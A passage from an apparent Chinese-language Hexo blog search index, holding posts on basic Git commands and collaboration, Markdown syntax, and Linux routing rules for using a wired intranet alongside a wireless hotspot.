执行完注意一下输出信息，可能有包存在冲突没有给自动升级，需要自行解决冲突或者强制升级。 参考 https://github.com/hexojs/hexo/issues/2508","link":"/2021/03/hexo-install-backup-recover-update/"},{"title":"Git 基本操作","text":"Git 是目前世界上最先进的分布式版本控制系统（廖雪峰说的），2008 年，GitHub 网站上线，它为开源项目免费提供 Git 存储，无数开源项目开始迁移至 GitHub。与集中式的版本控制 SVN 不同，分布式版本控制系统没有“中央服务器”，每个人的电脑上都是一个完整的版本库。 本文记录 Git 的各种常用的基本操作，方便使用时查阅。如果你是头一次接触 Git，建议先找一份教程完整的看一看，推荐 廖雪峰的 Git 教程，虽然有些内容讲的也比较绕，但是入门来说应该足够了。 初始设置 配置用户名和 Emailgit config --global user.name &quot;Your Name&quot;git config --global user.email &quot;email@example.com&quot; 在本地 Git 配置后，还需要在 GitHub 账号的 Settings - Emails 中添加并验证这个邮箱，才能与自己的 GitHub 账号关联。 设置和取消代理 设置合适的科研网络环境可以有效解决克隆仓库时速度慢的问题。 # httpgit config --global https.proxy http://127.0.0.1:8080git config --global http.proxy https://127.0.0.1:8080# socks5git config --global https.proxy socks5://127.0.0.1:1080git config --global http.proxy socks5://127.0.0.1:1080git config --global unset http.proxygit config --global unset https.proxy 基本操作 在本地创建版本库(repository)git init &lt;directory&gt;# 或者：cd &lt;directory&gt;git init 这样， &lt;directory&gt; 目录就变成了 Git 可管理的仓库，可以发现目录下多了一个隐藏的 .git 目录，不要手动改动这个目录里的东西。 查看仓库状态 如果第一次接触 Git，建议先搞清楚工作区（Working Directory）、版本库（Repository）和暂存区（Stage）的概念，可参考 廖雪峰的教程。 git status 使用这个命令可以看到： 工作区中已被修改但是未被添加到暂存区的文件（Changes not staged for commit） 已添加到工作区但是未提交的文件（Changes to be committed） 尚未被 Git 追踪的文件（Untracked files） 暂存区相关操作git add xxx.txt # 将工作区中修改的文件（Changes not staged for commit）添加到暂存区git rm --cached xxx.txt # 将暂存区的文件撤回到工作区git restore xxx.txt # 丢弃工作区中对文件的修改，使用暂存区中的版本 要注意区分第二个和第三个命令，它们的作用是不一样的。如果记不清这几个命令，输入 git status 会得到提示，提示中对命令的解释也很明确。 本地版本库操作git commit -m &quot;blablabla...&quot; # 将暂存区中的文件提交到版本库。需提供版本说明信息 # 执行这个命令前需要先把要提交的东西使用 git add 命令添加到暂存区 # 然后可以使用 git status 确认一下要提交的内容 git log [--oneline] # 查看版本库的所有 commit 记录。添加 --oneline 参数可以在一行显式git reflog # 查看命令历史，可以看到所有之前使用过的命令记录 默认的 log 命令显示的内容比较长，每次写都带参数的话又比较麻烦，我们可以使用 Git 的别名功能。将下面的这条命令输入到命令行中： git config --global alias.lg &quot;log --color --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset' --abbrev-commit&quot; 之后我们就可以用 git lg 来替代 git log ，可以看到，这样不仅显示的内容更加清晰，还能够显示出 commit 树的分支情况。 远程仓库操作git clone git@github.com:ChinaNuke/learnGit.git # 克隆远程仓库git remote add origin git@github.com:ChinaNuke/learnGit.git # 添加远程仓库 这两条命令的主要区别是，克隆一般用于 GitHub 上已经有了在开发的项目，我们需要把整个项目仓库下载到本地的情况（先有远程库，后有本地库）；而添加用于刚创建 GitHub 仓库，里面并没有东西的情况（先有本地库，后有远程库），但也可以用于第一种情况。 git push -u origin master # 把本地库的所有内容推送到远程库上，并为 master 分支建立链接 # origin 是远程库的名字，可以改成其他的，但一般用 origin 比较直观 # 一般来说，仅第一次推送时需要建立链接，后续推送不需要git push # 把当前分支的内容推送到远程库对应的分支git pull # 从远程库拉取分支的内容git reset --hard HEAD^ # 回退到上一个版本。HEAD^^ 为上上个版本，以此类推git reset --hard 1094a # 回退 / 还原到提交编号开头为 1094a 的版本 分支管理 留坑。 多人协作项目一般流程 使用 Git 和 GitHub 可以很方便地进行多人协作。多人协作中所用到的大部分命令已在前面提到，此处不对命令进行详细解释。 对于已经在 GitHub 上建好的项目，我们要先把它克隆到本地。 git clone git@github.com:ChinaNuke/learnGit.git [local directory] 其中，参数中的链接是远程仓库的地址，可以在 GitHub 项目页面找到。 [local directory] 为可选参数，如果指定了目录名，则克隆到这个目录，未指定则默认以仓库名来命名目录，此处为 learnGit 。 之后我们需要 cd learnGit 进入到仓库目录中，后续的操作都在仓库中进行。我们可以使用 git remote -v 命令查看当前仓库本地链接到的远程仓库，一般会看到 fetch 和 push 两个地址，如果没有推送权限，就看不到 push 地址。 然后我们就可以在本地进行开发了，开发过程中我们可以随时使用 git add 命令将工作区中修改过的文件添加到暂存区，然后使用 git commit 命令进行提交，使用 git lg 命令可以查看 commit 树。 在多人开发中，很有可能遇到这样一种情况：我在本地进行开发，其他人也在他的本地基于同一个版本进行开发，然后他在我们之前将修改提交到了远程仓库，这时候我们 push 时就会被拒绝。 To github.com:github.com:ChinaNuke/learnGit.git ! [rejected] dev -&gt; dev (non-fast-forward)error: failed to push some refs to 'git@github.com:ChinaNuke/learnGit.git'hint: Updates were rejected because the tip of your current branch is behindhint: its remote counterpart. Integrate the remote changes (e.g.hint: 'git pull ...') before pushing again.hint: See the 'Note about fast-forwards' in 'git push --help' for details. 原因显而易见，那如何解决呢？我们先用 git pull 命令把最新的提交从远程库拉取下来，在本地合并，这时可能会有冲突，需要我们手动进行合并（冲突合并方法见廖雪峰教程）。合并完冲突之后就可以再次进行推送了，但是在这之前我们先使用 git lg 命令看看现在的 commit 树，它是不直的，类似这个样子： * d1be385 (HEAD -&gt; master, origin/master) init hello* e5e69f1 Merge branch 'dev'|\\ | * 57c53ab (origin/dev, dev) fix env conflict| |\\ | | * 7a5e5dd add env| * | 7bd91f1 add new env| |/ * | 12a631b merged bug fix 101|\\ \\ | * | 4c805e2 fix bug 101|/ / * | e1e9c68 merge with no-ff|\\ \\ | |/ | * f52c633 add merge|/ * cf810e4 conflict fixed 这样很不好看，对强迫症很不友好。我们可以在推送前再加一步 git rebase ，正常情况下 Git 会自动将 commit 树整理成直的，执行完之后我们可以再次使用 git lg 看一下。最后，我们就可以用 git push 推送提交了。 关于 commit 树要整理成直的还是保留原始的修改记录，网上众说纷纭，我更倾向于整理成直的，清晰又直观！ 建议参考资料 Git Cheat Sheet: https://www.atlassian.com/git/tutorials/atlassian-git-cheatsheet 廖雪峰 Git 教程: https://www.liaoxuefeng.com/wiki/896043488029600","link":"/2020/09/how-to-use-git/"},{"title":"Markdown 基本语法","text":"Markdown 是一种轻量级的标记语言，对图片、图标和数学公式都有很好的支持，而且其语法极为简单，可以让我们更好的专注于写作内容。本文记录 Markdown 的各类基本语法和显示效果，以方便后续写作时查阅。 标题# 一级标题## 二级标题### 三级标题 效果： 一级标题 二级标题 三级标题 段落和换行 用一行的空行来隔开段落，Markdown Guide 不建议使用空格或者 TAB 对段落缩进。 这是第一段 这是第二段 效果：这是第一段 这是第二段 在行末添加两个及以上的空格或者加入 &lt;br&gt; 标签 可以单纯的进行换行 效果和上面一样。 这是第一行 &lt;br&gt; 这是第二行 效果：这是第一行 这是第二行 加粗和斜体** 加粗字体 *** 斜体字体 **** 加粗和斜体*** 效果：加粗字体 斜体字体 加粗和斜体 引用&gt; 这里是引用 效果： 这里是引用 &gt; 这里是多段引用&gt;&gt; 这是引用的第二段 效果： 这里是多段引用 这是引用的第二段 &gt; 这里是套娃引用&gt;&gt;&gt; 这是娃 效果： 这里是套娃引用 这是娃 引用中也可以再嵌套其他的格式。 有序和无序列表1. 有序列表第一项2. 有序列表第二项3. 有序列表第三项4. 不必保持标号顺序但是第一项必须为 1 效果： 有序列表第一项 有序列表第二项 有序列表第三项 不必保持标号顺序但是第一项必须为 1 - 无序列表第一项- 无序列表第二项- 无序列表第三项 效果： 无序列表第一项 无序列表第二项 无序列表第三项 在列表中添加元素同时保持列表连续，可以在插入的元素前面添加 四个空格 或者一个 TAB 缩进。 - 无序列表第一项- 无序列表第二项 列表之间插入文本，保持列表连续- 无序列表第三项 效果： 无序列表第一项 无序列表第二项 列表之间插入文本，保持列表连续 无序列表第三项 图片 ![ 图片替换文本 ]( 图片地址) 链接[小米 10 点击就送（假的）](https://nuke666.cn) 效果：小米 10 点击就送（假的） 代码块​``` python hello/hello.pydef my_print(): print('Hello World!')``` 效果：​``` python hello/hello.pydef my_print(): print(‘Hello World!’) ``` 以上便是 Markdown 常用的基本语法，其他不常用的语法并没有列出，以后有时间再开一篇记录扩展语法。 参考：Markdown Guide: Basic Syntax","link":"/2020/07/markdown-syntax/"},{"title":"Linux 多网络自动路由设置","text":"本文介绍如何通过设置本机上的路由规则，实现在同时连接多个网络时，根据目标地址所属网段来自动选择走哪一个网络。其中有线网卡连接内网（校园网 / 企业内网），无线网卡连接外网（手机热点），效果为：同时连接两个网络时，访问内网地址（指定网段）会走有线网络，访问其他网络地址会走无线网络；而单独连接其中一个网络时，也能够正常使用。 我所使用的操作系统是 Manjaro Linux，Gnome 桌面，对于其他操作系统和桌面环境未进行测试，请自行寻找是否有相似的设置。 首先设置无线网络，假设网关为 192.168.43.1 ，打开 设置 -&gt; 网络 ，点击有线网络的设置图标，切换到 IPv4 选项卡，在最下方“路由”设置中，关闭“自动”按钮，并填入以下内容。默认设置下，有线网络的优先级要高于无线网络，而我们需要无线网络优先于有线网络，因此通过调整跃点（Metric）的值为 99 来提高其优先级（有线网络的默认跃点值为 100，值越小优先级越高），点击“应用”并重新连接网络。 地址 子网掩码 网关 跃点 0.0.0.0 0.0.0.0 192.168.43.1 99 进行以上设置之后，当我们连接到这个网络时，会自动生成下面这样一条默认路由规则。它表示，在没有其他特定规则和优先级更高的默认规则与目标地址匹配时，则使用这条规则，即通过 wlp69s0 网卡访问 192.168.43.1 网关。 default via 192.168.43.1 dev wlp60s0 proto static metric 99 接着设置有线网络，假设网关为 192.168.2.1，我们需要让 172.16.0.0/12 网段的地址走这个网络。打开 设置 -&gt; WiFi，点击网络旁的设置按钮，同样切换到 IPv4 选项卡，关闭路由设置的“自动”按钮并填入以下内容，点击“应用”并重新连接网络。这里不设置跃点的值，使其保持默认值 100. 地址 子网掩码 网关 跃点 172.16.0.0 255.240.0.0 192.168.2.1 0.0.0.0 0.0.0.0 192.168.2.1 进行以上设置后，当我们再连接这个网络时，会自动生成下面这样两条路由规则。其中，第二条为特定规则，要优先于所有 default 规则。 default via 192.168.2.1 dev enp59s0 proto static metric 100 172.0.0.0/8 via 192.168.2.1 dev enp59s0 proto static metric 100 同时连接两个网络时，系统中所有的路由规则如下。对于 172 网段的地址，由于第三条特定静态规则的存在，它会通过 enp59s0 这个有线网卡来走 192.168.2.1 网关，也就是走内网，而对于其他没有定义特定规则的地址，有两条默认规则可以选择，但是第一条规则的优先级要高于第二条，所以对于其他的流量，都走无线网络。 $ ip route showdefault via 192.168.43.1 dev wlp60s0 proto static metric 99 default via 192.168.2.1 dev enp59s0 proto static metric 100 172.0.0.0/8 via 192.168.2.1 dev enp59s0 proto static metric 100 192.168.2.0/24 dev enp59s0 proto kernel scope link src 192.168.2.102 metric 100 192.168.43.0/24 dev wlp60s0 proto kernel scope link src 192.168.43.42 metric 600 而只连接有线网络时，系统中的路由规则如下。 $ ip route showdefault via 192.168.2.1 dev enp59s0 proto static metric 100 172.0.0.0/8 via 192.168.2.1 dev enp59s0 proto static metric 100 192.168.2.0/24 dev enp59s0 proto kernel scope link src 192.168.2.102 metric 100 只连接无线网络时，系统中的路由规则如下。 $ ip route showdefault via 192.168.43.1 dev wlp60s0 proto static metric 99 192.168.43.0/24 dev wlp60s0 proto kernel scope link src 192.168.43.42 metric 600 以上的路由规则也可以通过类似下面的命令来手动添加，但是这样添加的路由规则重启后便失效，而且不能随网络连接情况自动调整，因此并不推荐。 $ ip route add 172.0.0.0/8 via 192.168.2.1 dev enp59s0 参考和工具： linux 同时连接内外网的设置 - CSDN 东北大学 IP 地址聚合程序","link":"/2021/06/multi-network-routing/"}],"tags":[{"name":"Hexo","slug":"Hexo","link":"/tags/Hexo/"},{"name":"Git","slug":"Git","link":"/tags/Git/"},{"name":"Markdown","slug":"Markdown","link":"/tags/Markdown/"},{"name":"使用技巧","slug":"使用技巧","link":"/tags/%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"},{"name":"网络设置","slug":"网络设置","link":"/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/"}],"categories":[{"name":"网站","slug":"网站","link":"/categories/%E7%BD%91%E7%AB%99/"},{"name":"Linux","slug":"Linux","link":"/categories/Linux/"}]}